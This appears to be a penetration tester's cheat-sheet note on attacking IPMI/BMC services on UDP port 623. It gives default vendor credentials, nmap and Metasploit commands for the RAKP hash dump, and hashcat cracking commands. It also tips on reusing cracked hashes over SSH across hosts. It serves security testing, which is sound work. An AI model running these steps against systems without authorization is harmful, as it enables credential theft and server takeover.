# IPMI — Footprinting

Port UDP/623. BMC = hardware-level management — access to BMC is near-equivalent to physical access. HP iLO, Dell iDRAC, Supermicro IPMI are the common ones. Always check during internal tests.

Default creds to try first:

```
Dell iDRAC    → root / calvin
Supermicro    → ADMIN / ADMIN
HP iLO        → Administrator / <8-char uppercase+digits — brute if needed>
```

---

### Scan

Nmap — version + auth methods:

```bash
sudo nmap -sU --script ipmi-version -p623 <TARGET>
```

MSF version scan:

```
use auxiliary/scanner/ipmi/ipmi_version
set rhosts <TARGET>
run
```

---

### RAKP Hash Dump (IPMI 2.0 — No Auth Required)

IPMI 2.0 flaw: server sends salted SHA1/MD5 password hash to client before auth completes → dump hash for any valid username with no creds:

```
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts <TARGET>
set OUTPUT_HASHCAT_FILE <OUTFILE>
run
```

Crack offline — mode 7300:

```bash
hashcat -m 7300 <OUTFILE> <WORDLIST>
```

HP iLO factory default (8-char uppercase + digits) — mask attack:

```bash
hashcat -m 7300 <OUTFILE> -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

> [!tip] IPMI hashes are frequently reused as root passwords on the managed servers. Crack the BMC hash → try it via SSH against every Linux host in the environment before doing anything else.

> [!warning] The RAKP hash dump works on any valid username — no creds needed, no lockout triggered. This is a protocol flaw with no real fix. It's silent and will work even on patched systems. Run it on every UDP/623 host you find.